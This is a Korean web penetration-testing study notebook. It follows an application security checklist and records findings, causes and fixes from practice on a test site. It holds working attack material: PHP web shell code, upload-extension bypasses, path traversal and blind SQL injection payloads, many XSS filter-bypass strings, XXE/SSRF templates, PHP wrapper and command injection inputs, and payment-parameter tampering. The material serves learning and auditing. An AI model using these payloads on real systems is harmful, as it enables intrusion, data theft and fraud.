- 	: 팁
>> 	: 실습내용 (http://test.nanum.info:82/default.asp 에서 진행)


https://ctf.j0n9hyun.xyz/challenges	- 워 게임


https://overthewire.org/wargames/natas/	- 웹 워 게임


https://xss-game.appspot.com/level1		- xss 워 게임

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


https://dailyworker.github.io/AES-Algorithm-and-Chiper-mode/	- 암호화에 대해 (다이제스트, AES256, HASH, 대칭키, KDF 등)


******************************************************** SSC-E2-05 (애플리케이션 보안체크 리스트) **********************************************************************

1. 파일 업로드
 - 악성파일이 업로드 및 실행되는가?


>> https://holywaterkim.tistory.com/71 참고로 http://test.nanum.info:82/default.asp 사진 컨테스트 게시판에 테스트 해보기로 함


웹 서버가 IIS 6.0 -> asp 사용 (버프로 알아냄(정보노출 취약점), 보통은 .php 많이 쓰는 듯 함)

파일 이름을 testwebshell.asp    로 바꿔서 업로드 -> asp, html 확장자 필터링 중 -> 실패
파일 이름을 testwebshell.asp.kr 로 바꿔서 업로드 -> 업로드 성공

크롬에서 이미지 경로 다운으로 경로 알아냄 -> http://test.nanum.info:82/upload/bbs/testwebshell.asp.kr

이 url 로 접속해보니 안됨 -> ? 파일이 없다고 뜸
평범한 이미지를 업로드 시켜서 같은 경로로 접속하면 이미지 잘 보임 (이미지만 가능하게 화이트 리스트 방식으로 필터링 했나..) -> X
-> 버프 스위트로 image, image/jpeg라고 바꿔도 안됨
-> 파일 확장자를 download.cer 로 바꾸니까 실행됨 (해결)


- 파일 인클루전 공격과 파일 업로드 공격
	파일 인클루전 공격 : php include 함수를 악용, url 피해 홈페이지에서 해커의 홈페이지에 있는 파일을 실행 or  패스 트레버설로 타고 올라가서 내부 중요한 문서(ex. passwd.txt) 열람
	파일 업로드 공격	: 파일 업로드 기능이 있는 홈페이지에서 악성 파일(웹셸)을 올려 장악하는 것


- 파일 인클루전? 패스 트레버셜? 
	https://covenant.tistory.com/61
	https://zinsnoy.tistory.com/9


- 웹쉘 사용 방법

<html>
<?
$data = "";
$data = $_GET['data'];
passthru("$data");
?>
</html>

or

<?php
system("cat /etc/passwd");
?>

간단한 웹쉘 코드 test.php 이름으로 만듬
파일업로드 취약점을 이용하여 올리고 해당 파일경로에 들어가 실행 
그 뒤 GET 방식으로 뒤에 ?data=ls+-al 입력 -> 성공

	- 파일확장자를 강제로 바꿀때 개발자 도구가서 바꿀수 있는 홈페이지도 운좋으면 있을듯

	- 이미지 인지 아닌지 검사하면 HxD로 앞에 이미지 시그니처를 넣거나 (FF D8 FF E0) 버프에서 BM 넣어도 됨


- .htaccess 취약점 (파일업로드 취약점)
	.htaccess는 Hypertext access의 준말로, 웹 서버 구성의 분산된 관리를 위해, 여러 엡 서버가 지원하는 디렉토리 수준의 설정 파일

	안의 내용
	- AddType application/x-httpd-php .txt .abc .xyz	, ".txt", ".abc", ".xyz" 확장자를 가진 파일을 php파일로 실행(3 확장자를 php로 취급)
	- php_flag engine off				,  php 엔진을 off 시켜서 php 소스 열람



** 발견한 취약점
1. 웹쉘이 업로드 가능함
2. 업로드된 파일이 실행 가능
3. 업로드된 파일의 악성코드 여부 검사 안함


@@ 원인 분석
- 클라이언트 확장자 필터링 후 최종 등록 시 서버에서 확장자 검증이 미흡하여 악성 파일 업로드 가능

@@ 개선 방안
- 서버에 최종 등록 시 첨부 가능한 확장자만 허용하도록 확장자 체크기능 추가 구현



** 확장자 우회 하는 다른 방법  ASP -> .cer , .cdx , .asa
			   PHP -> .php3, .html, .htm
			   JSP  -> .war

------------------------------------------------------------------------------------------------------------------------------------------------

2. 파일 다운로드
 - 시스템 내 파일 (소스파일, 환경 파일, 로그파일, 백업파일, 
   임시파일 등)이 무단으로 다운로드 가능한가?

- 파일 다운로드 취약점? LFI, RFI
	https://stupidsecurity.tistory.com/19	- 공격 시 코드
	https://duni0107-day.tstory.com/78 	- 이해를 위한 간단한 예제 
	https://pcmc.tistory.com/40		- 파일 다운로드 & 파일업로드 취약점 그림으로 이해 
	https://4rgos.tistory.com/8		- 정리 제일 잘되어 있음

	(http://server/link.php?file=../../../../../../../../etc/passwd)
	(http://server/link.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd) -> URL인코딩
	(http://server/link.php?file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==) -> BASE64인코딩

	%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%68%6f%73%74%73 
	-> hosts 인코딩

	/....//....//....//....//....//....//....//....//....//....//etc/&physical=hosts

	../../../../../../boot.ini
	../../../../../../boot.ini.txt

- 윈도우인지 리눅스 인지 구분 방법
	윈도우는 대소문자를 구분하지 않지만, 리눅스는 대소문자를 구분합니다.
	대문자로 바꿔도 그대로 다운이 받아진다면 윈도우라고 쉽게 알 수 있습니다.

	또한, jsp나 php이면 리눅스일 가능성이 높습니다.


- 파일 다운로드 취약점 시 찾아볼것
	https://rootable.tistory.com/entry/%ED%8C%8C%EC%9D%BC-%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%9C-%EC%B0%BE%EC%95%84%EB%B3%BC-%EA%B2%83


- 단순히 파라미터만 변경해서 바뀐거는 취약점이 아님 누가봐도 취약한거 (시스템파일 등)이 나와야 다운로드 취약점


- 파일 이름을 숫자로 바꿔놓은건 보안 방식 중 하나, 이 때 시도 해볼만한건 파일 이름에서 숫자로 보안 적용하기 전에 썼던 기본 파일명 같은거 써보기
  혹은 주석으로 전에는 이런 이름이였다 라고 써놓는 경우도 있다고 하니 꼼꼼하게 찾아볼 것
	ex) backup.zip  .bak 파일


@@ 개선 방안
필터링등의 보안추가가 필요함

------------------------------------------------------------------------------------------------------------------------------------------------

3. 파라미터 조작(변조)
 - 파라미터 조작을 통해 권한 밖의 정보도용이 가능한가?
 - 파라미터 조작을 통해 과금 우회 등 악용이 가능한가?


>> 게시판에서 다른 사람의 이름으로 등록, 수정, 비밀글 접근을 시행

>> 자신이 쓴 글을 다른 사람이 쓴거 처럼 수정은 가능하지만 다른 사람들 글의 수정은 비밀번호를 알아내야 하는데 불가능 (세션값으로 구분, 시큐어 코딩)
     마찬가지로 비밀글도 접근이 불가능, 비밀번호를 알고있는 비밀글을 만들어 접근성공시 얻은 패킷을 따서 대입하려 했지만 실패
	-> 비밀번호를 알고 있는 게시글을 하나 만들고 수정 페이지 들어간 다음 버프 키고 새로고침
	-> 접근하고자하는 게시글 idx 입력후 포워딩 하면 접근 가능 (해결)

--> 쿠키는 escape 함수로 암호화

>> 결제값이 평문화로 전송되어 버프스위트로 조작 -> 10만원짜리 10원에 결제 


** 발견한 취약점
1. 파라미터 조작으로 결제값 조작
2. 다른 사람이 쓴 글로 위장 가능 


@@ 원인 분석
- 게시판 글 및 댓글 작성 시, 작성자 검증이 미흡하여 관리자 도용을 통한 악성 행위 가능
	>> 프록시 툴에서 작성자를 admin으로 바꾼뒤 foward
	>> idx값을 바꿔치기해서 게시물 변조


@@ 개선 방안
- 게시글 및 댓글 등록 시, 최종 단계인 서버를 통해 작성자를 비교하여 등록되도록 검증 로직 추가

------------------------------------------------------------------------------------------------------------------------------------------------

4. 인증 우회
 - 인증 우회가 가능한가?

 - 클라이언트 프로그램을 조작하여 보안기능(로그인, 체크로직 등)을
   우회 가능한가?

5. SQL Injection
 - DB Data 추출 또는 DB 명령어 실행이 가능한가?


>> 아이디와 비밀번호는 평문화 전송을 함- > 버프 스위트로 스니핑 하면 볼 수 있음

>> 로그인 폼에 'or 1=1 --  대입시 실패, 필터링하고 있는 것으로 추청 -> 대신 DB 에러 메시지 노출 -> DB data 추출 가능해 보임
>> ' and 1=1-- 등의 블라인드 인젝션을 시도 했으니 결과는 같음


https://www.kitploit.com/2019/11/sql-injection-payload-list.html?m=1	- sql 인젝션 페이로드 리스트


http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet	- mssql 인젝션 치트시트


https://armadablog.tistory.com/28	- db 종류 파악하기 


http://coashanee5.blogspot.com/2017/11/sql-injection_12.html	- sql injection 실습
https://code1018.tistory.com/103				- 단계별 sql injection 실습 (시나리오)


- php magic_quotes_gpc 설정 우회를 통한 sql injection (php 버전 5.4.0 부터 제거되는 기능)

	magic_quotes_gpc이란 : gpc 즉 get, post, cookie 를 사용하여 넘어온 밸류들에 대해서 quotes(', ", \, 널문자 등) 가 있을때 알아서 그러니까 마법처럼 알아서 \ 를 붙여준다.

	우회방법 : 앞에 %aa 를 써준다	, ex) %aa' or 1=1#


https://www.abatchy.com/2016/12/natas-level-17		- blind injection sleep으로 실행하기 (오류를 뱉지 않을 때)


- blind injection 으로 테이블 명 알아내기
	- 우선 id 는 안다고 가정할 시 (로그인 실패시 아이디가 틀렸습니다 or 비밀번호가 틀렸습니다 같이 하나만 나올때 사용 가능 할듯)
	- id 칸에 
		admin' and ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_type='base table' limit 0,1),1,1)) <120#
	- 뒤에 120 을 줄여가면서 파악
	  ex) 118 을 넣었을때 로그인 성공했다 -> = 117 으로 시도 해서 로그인 성공 -> 첫 글자는 아스키 117 인 'u'

	- ...'base table' limit 0,1),2,1)), ...'base table' limit 0,1),3,1)) 이렇게 하나하나 늘려가면서 알아내면 됨


- blind injection (id가 admin이 존재할때)
	id = admin'and length(pw)=1		, pw 길이 확인
	id = admin'and ascii(substr(pw,1,1))=1		, pw 확인


** 발견한 취약점
1. DB 에러 메시지 노출
2. 아이디&비밀번호 평문화


@@ 원인 분석
- 회원 가입 후 등록 시 최종 단계인 서버에서 검증이 미흡하여 동일한 아이디로 회원가입 가능
	>> 프록시 툴에서 ID 중복체크 로직 삭제하여 진행


@@ 개선 방안
- 회원가입시, ID 중복체크 로직을 서버 측에서 구현해야 함

------------------------------------------------------------------------------------------------------------------------------------------------

4.5. 중복 가능
 - 권한 밖의 정보 조회가 가능한가?

>> 검색창에 %를 입력하였지만 권한이 없는 정보는 나오지 않음



** 발견한 취약점
0

------------------------------------------------------------------------------------------------------------------------------------------------

5.XSS
 - HTML 태그 스크립트 저장 및 실행이 가능한가?

>> 전반적으로 홈페이지 입력란에 <script>alert(document.cookie);</script> 
			       <script>alert('1');</script>  공격이 먹히는지 확인

>> url 에 붙여넣을시 브라우저 자체에서 막아버림 (IE 기준, 크롬에서는 안막음)


*** 우회 시도시 가장 중요한것은 해당 웹사이트가 어떻게 필터링하는지 알아서 그에 맞춰서 우회하는 것


- 우회방법
1. <a href="javascript:alert('XSS')">XSS</a>		, 자바스크립트를 필터링 많이 해놓아서 잘 먹히지는 않지만 안한곳도 있을 가능성 있음
2. <ruby onmouseover="alert('XSS')">XSS</ruby>	, 블랙리스트 우회 방법, 요즘은 화이트 리스트 방식이라 막힐 가능성 높음
						  내용 난독화, 스크립트 난독화 등 방법이 있음
3. <img src=”x” onerror=”alert(1);">
4. <svg/whatthe=""onload=alert(45)>

	/ => fileted
	%20 => filtered
	/; => not filted, 	  payload = "><svg/;onload="alert(45)"onload=alert(45)>">
			  whatthe = "'><svg/whatthe=""onload=alert(45)>

5. <div onpointerover="alert(45)">hahwul(45)</div>
   <div onpointerdown="alert(45)">hahwul(45)</div>			, click 시
   <div onpointerenter="alert(45)">hahwul(45)</div>
   <div onpointerleave="alert(45)">hahwul(45)</div>
   <div onpointermove="alert(45)">hahwul(45)</div>
   <div onpointerout="alert(45)">hahwul(45)</div>
   <div onpointerup="alert(45)">hahwul(45)</div>			, 만약 on* 이 필터링 되어있으면 어려움

6. <script>
  var test = "injection <!-- <script/";
  </script>
  <img src="</script><script>alert(origin)</script>">			, 자바스크립트 내부에 코드가 삽입되었지만 문자열을 탈출할 수 없을 때 사용


7. <iframe src=javascript:alert(2)></iframe>

8. <input autofocus onfocus="alert(4)">

9. ([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(45)')()

10. <object type="text/xscriptlet" data="http://xss.rocks/scriptlet.html"></object>
	-> 지정한 파일이 존재 하지 않을때 사이트로 이동
	-> http://xss.rocks/scriptlet.html 			, 약간 공식처럼 이렇게 쓰는 듯 

11. https://www.hahwul.com/2017/03/web-hacking-data-xss-filtering-bypass.html	. data: 구문을이용한 xss (form 태그)

12. <script>alert(1);<script> 에서 연속하는 문자가 막혔을때 ex) s = 가능, sc = 막힘, cr = 막힘, 이런 식으로

	-> <s%00c%00r%00i%00p%00t>a%00l%00e%00r%00t(1);</s%00c%00r%00i%00p%00t> 이렇게하면 우회됨 (널바이트 삽입 우회)

13. 문자열 우회, ex) 2 = char(50)	,https://lightblog.tistory.com/77



https://blog.rubiya.kr/index.php/2019/03/28/browsers-xss-filter-bypass-cheat-sheet/	- xss 치트 시트

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet		- xss 치트 시트 2019

https://www.hahwul.com/2016/06/web-hacking-anti-xss-filter-evasion-of.html		- xss 필터링 우회

https://www.hahwul.com/2015/06/web-hacking-hex-encoding-xss.html		- xss 필터링 우회 2 (hex encoding)

https://ar9ang3.tistory.com/31						- xss 필터링 우회 3 (특수문자 필터링)

https://github.com/hahwul/XSS-Payload-without-Anything				- xss 필터링 우회 4 (특수문자 필터링2)

https://www.hahwul.com/2017/01/web-hacking-bypass-xssquotation.html		- xss 필터링 우회 5 (",' 이 필터링 될때 사용)



- Data Url Scheme

	데이터를 url 표현으로 바꿔주는 것
	data:[자료타입],[데이터]		, ex) data:text/javascript,alert(1);
					      data:text/html,<script>alert(1);</script>;
					      data:text/html,%3Ch1%3EHello%2C%20World!%3C%2Fh1%3E
					      data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K


- reflected xss 가 get 방식으로만 가능한게 아님, 버프스위트에서 post를 get으로 바꿀 수 있음(리피터에서)

>> 시나리오
  post 형식으로 파라미터들이 날라갈때(send) response에 잘보면 형식으로 포함되는 것이 있음(ex. next_url=xxx ), 그럼 의심!
  뒤에 간단하게 <xss> 이런거 붙여서 한번더 send -> <xss>까지 포함시킴(거의 확신) -> 그럼 get 형식으로 바꿔서 reflected xss 테스트
  무조건 cheat sheet 만 붙여 넣기 하지말고 구문 잘 확인 하기, 특히 띄어쓰기(url 에 넣을땐 +), ex. xxx>+' ' = xss 됨 
										 xxx>+'   = xss 안됨
										 xxx>  ' ' = xss 안됨 




** 발견한 취약점
1. XSS 취약점
2. csrf 취약점



@@ 원인 분석
- 파라미터를 넘겨주는 함수의 검증 미흡 때문


@@ 개선 방안
- 스크립트 공격 구문 삽입이 가능한 특수문자(<, >, ”등) 입력 값 필터링 필요

------------------------------------------------------------------------------------------------------------------------------------------------

6.CSRF
 - CSRF(Cross Site Request Forgery) 취약점인 신뢰된 사용자에 
   의해서 또는 사용중인 세션을 이용하여 공격이 가능한가?


>> csrf 코드는 등록이 되나 실행되지 않음
>> 관리자 계정이 없어서 테스트 해볼수 없으니 무용지물

------------------------------------------------------------------------------------------------------------------------------------------------

5.6. 중복 가능
 - WebView 내 addJavascriptInterface 메소드를 사용하는 경우 
    HTML 태그 스크립트 저장 및 실행이 가능한가?


------------------------------------------------------------------------------------------------------------------------------------------------

A. XML 태그를 사용하여 주요 시스템 파일 접근이 가능한가?


XXE 개념 & 실습 : 		       : https://beistlab.files.wordpress.com/2015/01/grayhash_intro_xxe.pdf
			         https://portswigger.net/web-security/xxe

	* 근본적으로 entity 기능을 비활성화하면 XXE Injection은 불가 함
	   secure coding을 통해 막을 수 있다. (PHP 기준)

 		- limxml_use_internal_errors(true) : XML 파싱 도중 오류가 발생하였을 경우, 오류 메시지를 출력하지 않게 해주는 함수
 		- libxml_disable_entity_loader(true) : 외부 리소스를 불러오지 못하게 하는 함수



-- XXE 기본 코드 

<?xml version="1.0" encoding="UTF-8">
<!DOCTYPE rootable[
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rootable>
	<simple>&xxe;</simple>
</rootable>



-- SSRF 공격을 위해 XXE 활용

<! DOCTYPE foo [<! ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">]>

------------------------------------------------------------------------------------------------------------------------------------------------

A. URL 파라미터를 사용하여 임의 주소로 이동이 가능한가?

>>http://test.nanum.info:82/default.asp?target_url=www.naver.com 으로 접근했지만 리다이렉트 되지 않음
				  next_url=www.naver.com

** 발견한 취약점
0


@@ 원인 분석
- 요청 URL 값을 검증하지 않아 검증되지 않은 사이트로 이동이 가능함


@@ 개선 방안
- 사용자의 요청에 따라 지정된 URL로 리다이렉트 되도록 설정해야함

------------------------------------------------------------------------------------------------------------------------------------------------

7.패스워드 복잡도 검증
 - 패스워드 생성 시 패스워드 구성에 대한 복잡도가 적용되었는가?


>> 패스워드를 1로 설정해도 허락함



** 발견한 취약점
1. 패스워드 복잡도 미 확인


@@ 원인 분석
- 서버 측에서 패스워드 검증이 미흡하여 취약한 패스워드 변경 가능
	>> 홈페이지에서는 비밀번호를 11로 바꾸는게 불가능하지만 프록시 툴을 사용시 변경 된단 소리


@@ 개선 방안
- 서버 측에서 패스워드 체크 로직을 구현해야 함

------------------------------------------------------------------------------------------------------------------------------------------------

8.비 암호화 통신
 - 패스워드 전송시 SSL 또는 웹구간암호화되어 전송되는가?

>> 버프 스위트로 mitm시 평문으로 전송하는 것을 확인


** 발견한 취약점
1. 패스워드 전송시 평문으로 전송

------------------------------------------------------------------------------------------------------------------------------------------------
   
9.인증 미흡
 - 인증 없는 상태에서 시스템 접근이 불가능하도록 적용되었는가?

 - 주요 Extranet에 대한 사용자 인증에 대한 강화방안이 
   적용되었는가?
 - 지불 결제 시 별도의 추가 인증단계를 요구하고 있는가?
 - 금융거래 악용 방지를 위한 보안대책이 적용되었는가?

 - 회원정보 조회/수정 시에 이용자의 비밀번호를 다시 요구하는 
   등의 재인증 과정을 시행하고 있는가?


>> 회원 정보 수정시 비밀번호를 다시 안물어봄

>> url에 OOO_view 이런식으로 있는 거 OOO_edit 로 바꿔보기  ex) http://test.nanum.info:82/board_view.asp?data=idx...


@@ 원인 분석
- 관리자 시스템 관리 메뉴 접근 시 재인증 과정 미흡
	>> 일반 사용자계정으로 admin 계정 비밀번호 교체 가능(비밀번호 변경창에서 프록시로 캡처했을 때 id를 바꿀수 있는 파라미터가 존재할 때, admin id를 알아야 한다는게 조건)


@@ 개선 방안
- 기존 비밀번호 확인 입력폼을 새로 만들어 서버에서 비교 후 패스워드가 변경되도록 조치
- 개인정보 수정 페이지에 접근 시 재인증(비밀번호, otp 등)하여 접근하도록 구현


------------------------------------------------------------------------------------------------------------------------------------------------

10.쿠키 변조
 - 쿠키, 세션정보 변조를 통해 개인 명의 및 권한 도용이 가능한 
   취약점이 존재하는가?
 - 로그인 정보를 획득하여 암호화된 값이 복호화되거나 
   Replay Attack이 가능한가?

------------------------------------------------------------------------------------------------------------------------------------------------
   
11.정보 노출
 - 쿠키, 소스, GET 방식을 통해 중요정보가 노출되고 있는가?
 - 불필요 파일을 통해 중요정보가 노출되고 있는가?
 - 클라이언트에 보여지는 에러 메시지에서 중요정보가 노출되는가?

 - 중요 개인정보를 시스템(DBMS, 서버, 스토리지 等 물리적 
   저장매체 모두)내 암호화하여 저장하고 있는가?
 - 화면에 표시되는 개인정보(전화번호, 휴대폰 번호 등)이 
   마스킹처리되고 있는가?


>> 페이지 소스 보기로 ./script/admin.js 파일이 있다는것을 확인 -> http://test.nanum.info:82/script/admin.js 로 접속 = 소스코드 노출

>> 존재하는 디렉토리 접근 시 403 에러 뜨는 지 확인

>> 존재하지 않는 임의의 웹 페이지 접근시 버프 스위트로 서버 노출되나 확인 -> 서버정보가 노출되면 그 버전에 있는 취약점들을 시도해볼수 도 있음
		ex) server : microsoft-IIS/7.5 

		-> 취약점은 아니고 권고 사항

>> 파일 업로드 후 소스 보기로 파일명 검색 후 절대경로로 표시 되는지 확인 (함수가 절대 경로로 처리할수도 있음, 그럴 땐 그 함수가 노출되지 않게 조치)


? 소스 보기로는 상대경로로 처리하는데 크롬에서 링크 주소 복사시 절대 경로가 복사가 되는데 이것도 취약점인지? 취약점이라면 조치는?


@@ 원인 분석
- 403 에러 발생 시 헤더 값에 403 Forbidden이 노출되어 디렉터리 추측 가능
   즉, 있는건 403 뜨고 없는건 404 뜨니까 추측해서 떄려 맞출수 있다 라는 뜻

	-> 취약점이 아닌 권고 사항

- 에러 페이지로 리다이렉트 처리 시 서버 설정 미흡


@@ 개선 방안
- IIS(인터넷 정보 서비스) 관리자 서비스를 통해 Response 헤더 Server 변수 제거 설정

------------------------------------------------------------------------------------------------------------------------------------------------

12.불필요한 메소드 설정
 - 불필요한 메소드 및 명령어가 활성화되어 있는가?

------------------------------------------------------------------------------------------------------------------------------------------------

13.디렉토리 리스팅
 - 디렉토리 리스팅이 가능한가?


>>url 에서 디렉토리까지만 남기고 접속하면 파일 리스트가 뜨는지 확인

------------------------------------------------------------------------------------------------------------------------------------------------

14.불필요한 계정 존재
 - 어플리케이션(웹서버, WAS, 솔루션 등) 설치 시 기본적으로 
   생성되는 ID/패스워드로 접속이 가능한가?
 - 미사용 계정 및 불필요 계정 등이 존재하는가?

------------------------------------------------------------------------------------------------------------------------------------------------

15.관리자페이지 접근제어 미흡
 - 관리자페이지가 인터넷에서 임의로 접근이 불가능하도록 
   적용되었는가?

------------------------------------------------------------------------------------------------------------------------------------------------

16.불필요한 주민번호 사용, 불필요한 파일 존재
 - 계정 및 패스워드 찾기 기능을 위해 주민번호를 사용하고 있는가?
 - 회원가입, 정보변경, 계정 찾기 등 주민번호를 수집하는 기능이 남아 있는가? 
 - 서버 운영상 불필요한 테스트 파일이 존재하지는 않는가?


>> test, backup 등의 디렉토리가 있거나 .bak, text.aspx 등의 파일이 있는지 찾아보기 (감으로)


@@ 원인 분석
- 개발 및 테스트 용으로 만들어둔 백업 파일이 운영 서버에 존재


@@ 개선 방안
- 개발 및 테스트 용으로 만든 백업 파일은 사용 후 삭제 조치하거나 필요 시 공격자가 접근하지 못하도록 복잡한 디렉터리 또는 접근제어 기능 추가

------------------------------------------------------------------------------------------------------------------------------------------------
   
17. 취약한(불안전한) 암호화 알고리즘 사용
 - 패스워드가 안전한 암호화 알고리즘을 사용하여 저장되는가?      

- 서버 진단 수준
 - 계정발급 절차 및 발급이력이 존재하는가?
 - 퇴직자, 장기간 미 접속자 등 미사용 계정에 대한 관리기준이 
   존재하는가?

 - 원격에서 소스 생성/수정/삭제가 가능한 서비스가 가동되고 
   있는가?
 - 시스템 첫화면 또는 연결화면에 개인정보 취급방침
   (정보통신망법기준), 처리방침(개인정보보호법기준) 및 약관이 
   명시되었는가?
 - 회원 가입시 만14세 이상과 미만을 구분하여 가입절차를 
   진행하고 있는가?
 - 개인정보 수집·이용목적, 수집하는 개인정보의 항목, 개인정보의
   보유 및 이용기간에 대해서 정보주체(이용자)에게 알리고 적합한
   동의를 받고 있는가?


>> 로그인 시 평문 패스워드를 복호화 가능한 MD5로 변환하여 패스워드 비교, SHA1도 복호화 가능

md5 암호화 사이트		: https://tools.web-max.ca/encode_decode.php
md5 복호화 사이트		: https://md5.web-max.ca/


@@ 개선 방안
KISA에서 권고하는 SHA-2(SHA-224/256/384/512 등) 이상 일방향 암호 알고리즘 사용


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

이런 방식도 있음 


php extract 취약점을 이용한 해킹 : https://duwjdtn11.tistory.com/355
			        https://xer0s.tistory.com/29
	@ HackCTF - guessing me

php strcmp 취약점을 이용한 해킹  : https://tistory.jeongjy.kr/79
	@ HackCTF - input check

X-Forwarded-For 취약점을 이용한 해킹(해킹은 아니지만 활용 가능성 있음)
	@ HackCTF - home


https://posix.tistory.com/95		- 취약점이 존재 가능한 php 함수


php exec, popen, passthru 등은 command Execution 취약점이 있는 함수 & 보안		- https://vmilsh.tistory.com/287
	만일 외부 명령어 사용할 때 ` 를 필터링 한다면 $(command)로 우회 가능

	ex) mkdir name = mkdir `name` = mkdir $(name)


php eval, include 등은 code execution 취약점이 있는 함수, LFI, RFI 공격을 할 수 있다.


- php wrapper 를 이용한 공격방식

	expect://		, system command를 실행, www.naver.com.index.php?page=expect://ls		= 디렉토리를 볼수있음
	filter://		, encode,decode 사용, www.naver.com.index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd 	, 내부코드를 볼수 있음
	zip://		, zip 파일풀고 안의 코드실행, www.naver.com.index.php?page=zip://file.zip#shell.php


- php 테스트 사이트 : http://phptester.net/


- vi 비정상 종료시 생기는 .*.swp 는 숨김파일인데
	https://webhacking.kr/challenge/bonus-8/.index.php.swp 라고 치면 다운로드가 됨, 한번씩 써먹어보면 좋을듯함


- 개행문자 인젝션(CRLF 인젝션)
	\r\n은 엔터를 친것과 같이 작용한다. (= %0D%0A)	, 결과값이 밑으로 쭈루룩 나올때 써볼만함 (메일 헤더 인젝션 할때도 사용)

	ex) http://example.com/?id=101%0D%0ASet-cookie+SID=a123456789	= http://example.com/?id=101
									   Set-cookie+SID=a123456789

	이 되어 새로운 헤더가 만들어진다. 이 예에서는 새로운 쿠키를 만드는 것


- 메일 헤더 인젝션

	개행문자를 이용하여 뒤에 cc:[빈칸][자기 주소] 로 정보 탈취	, cc = 참조, Bcc = 숨은 참조		, cc가 안된다면 Bcc로 해보자
	post로 쭈루룩 아래로 보내는 코드에 사용 가능하다.


- 명령어 인젝션

	입력에 대한 값을 제대로 인증을 안하면 코드 인젝션을 할수 있게 된다.
	예를들어 서버가 리눅스이고 웹 페이지에 파일을 올렸다 지울 수 있는 기능이 있다고 보면 파일을 지울때 리눅스에서는 rm 명령어를 쓸것이다
	그럼 filename에 ;ls 를 넣어주어 서버에서는 rm [폴더][파일명] => rm /upload ;ls 가 되어 ls의 내용이 보이게 된다


 
SSRF 공격 방식	  	       : https://saltlee.tistory.com/5
			       : https://code-machina.github.io/2019/09/25/Server-Side-Request-Forgery-Prevention.html

- SSRF vs CSRF
	CSRF : 클라이언트 단에서 악의적인 요청을 날리는 것		, 서버->클라이언트
	SSRF : 서버 단에서 악의적인 요청을 날리도록 공격하는 것		, 서버 -> 서버 (외부에서 내부망에 대한 접근이나 스캔, 각종 보안장비를 넘어갈 수 있는 중요한 키 포인트)

	SSRF cheat sheet : https://www.hahwul.com/p/ssrf-open-redirect-cheat-sheet.html

		- 웹 어플리 케이션이 xxe 공격에 취약하다면 SSRF 공격을 시도 해볼만 하다


- OAuth 를 이용한 토큰탈취 취약점		: https://www.hahwul.com/2019/06/oauth-chained-bugs-to-leak-oauth-token.html


- openssl 취약점을 이용한 heartblood 취약점 이론 & 실습		: https://blog.alyac.co.kr/76 
  (리눅스 필요)						  https://m.blog.naver.com/PostView.nhn?blogId=shs6903&logNo=220517501459&proxyReferer=https%3A%2F%2Fwww.google.com%2F


- iframe injection : 
	iframe : html 문서 안에 또 다른 html 문서를 보여주는 태그

	ex) <iframe src="www.naver.com" width="0" height="0" frameborder="0"></iframe>

		* iframe 인젝션이 가능하면 xss도 가능 (xss보다 훨씬 유용)


- LDAP injection
	LDAP : 디렉토리 서비스를 조회하고 수정하는 응용 프로토콜
	대부분의 sso는 LDAP 프로토콜을 사용함
	윈도우 계열에서는 AD서버, 유닉스 계열의 서버에서는 LDAP를 흔히 사용함
	  - LDAP 서버 ,LDAP 데이터베이스 존재


- json hijacking (페이지가 json으로 짜여졌을때)
	json 이란	: https://zeddios.tistory.com/90

	https://www.hahwul.com/2019/07/json-hijacking-with-script-src.html


- ESI injection	-> 해당 취약점이 있다면 SSRF, session hijacking, xss, xxe 공격이 가능함	, https://www.hahwul.com/2018/08/edge-side-include-injection-web-attack.html

	- 취약점 판단 방법 (esi 지원만해도 취약점이 존재할 수 있음)
	    FOO<!—esi —>BAR 	→ FOOBAR (취약) 
	    FOO<!—foo —>BAR 	→ FOO<!—foo —>BAR

		* 만일 서버가 Apache Traffic Server(ATS), Oracle Web Cache 라면 무조건 체크해 볼것


- 개발자 도구(F12)로 파일 확인해서 중요 정보가 노출되는가도 확인

- 이밖에도 kisa 에서 나온 주요통신기발시설_기술적_취약점_분석평가 가이드 도 확인하면서 진행



burp suite 사용법

>> 브루트포스 할때 팁 : 숫자(640개) + -admin 되어 hex로 인코딩 되는 세션 ID가 있을때 이중 관리자 세션 아이디를 찾고 싶다 (ex. 1-admin,2-admin.... )

	intruder에 payload type 	: 숫자(numbers)
		 payload option 	: from 1 - to 640 step 1
		 nunber format	: hex, min 1 - max 650

		* payload processing
			add suffix : -admin , Encode as ASCII hex 항목 추가	(suffix : 접미사)


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

들어본 단어들

퍼지테스트 : 소프트웨어에 랜덤 데이터를 입력함으로써 SW의 조직적인 실패를 유발시켜 발생되는 예외, 오류 등을 분석하고 보안 취약점을 찾아내는 테스팅 기법 (영화 더퍼지 생각하면 될듯)
	    단순하지만 취약점 찾을 확률이 낮음, 테스트 툴이 존재

DTD	  : html, xml 등에 쓰이는 문서 형식 선언, 문서 형식을 정의 해주는 것 (html 은 고유의 DTD가 있는 xml이라고 정의 가능)

SOP	  : 다른 출처 간 자원 접근 차단 정책

